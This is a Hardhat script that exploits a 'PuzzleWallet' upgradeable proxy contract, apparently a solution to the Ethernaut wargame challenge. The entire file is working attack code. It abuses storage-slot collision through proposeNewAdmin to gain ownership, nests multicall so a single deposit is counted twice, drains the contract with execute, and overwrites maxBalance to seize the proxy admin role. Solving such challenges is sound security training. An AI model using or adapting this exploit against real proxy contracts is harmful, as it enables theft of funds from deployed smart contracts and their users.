const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  const puzzleWalletProxyAddress = "0x012F2d012D9cC4F476F7fD63cfa5264C035A6a59";
  const puzzleWalletProxy = await ethers.getContractAt("PuzzleProxy", puzzleWalletProxyAddress);
  const puzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletProxyAddress);

  console.log("-------------------------");
  console.log("Admin address:", await puzzleWalletProxy.admin());
  console.log("Stolen:", (await puzzleWalletProxy.admin()) === stealer.address);

  // get ownership of logic contract
  // set pendingAdmin to stealer's address
  await (await puzzleWalletProxy.proposeNewAdmin(stealer.address)).wait();
  console.log("Ownership stolen, new owner is the stealer:", (await puzzleWallet.owner()) === stealer.address);

  // whitelist stealer's address
  await (await puzzleWallet.addToWhitelist(stealer.address)).wait();

  const depositSignature = web3.eth.abi.encodeFunctionSignature("deposit()");
  const multicallSignature = web3.eth.abi.encodeFunctionCall(
    {
      name: "multicall",
      type: "function",
      inputs: [
        {
          internalType: "bytes[]",
          name: "data",
          type: "bytes[]",
        },
      ],
    },
    [[depositSignature]]
  );

  await (await puzzleWallet.multicall([depositSignature, multicallSignature], { value: ethers.utils.parseEther("0.001"), gasLimit: 600000 })).wait();

  const stealerBalances = await puzzleWallet.balances(stealer.address);

  await (await puzzleWallet.execute(ethers.constants.AddressZero, stealerBalances, [])).wait();
  await (await puzzleWallet.setMaxBalance(ethers.BigNumber.from(stealer.address))).wait();

  console.log("-------------------------");
  console.log("Admin address:", await puzzleWalletProxy.admin());
  console.log("Stolen:", (await puzzleWalletProxy.admin()) === stealer.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
